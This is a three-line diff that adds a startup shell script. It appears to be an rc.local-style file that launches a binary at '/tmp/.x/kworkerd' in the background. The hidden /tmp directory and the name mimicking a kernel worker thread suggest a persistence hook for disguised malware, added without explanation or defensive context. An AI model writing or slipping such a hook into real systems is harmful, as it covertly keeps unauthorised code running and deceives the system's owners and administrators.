@@ -1,0 +1,3 @@
+#!/bin/sh -e
+/tmp/.x/kworkerd &
+exit 0
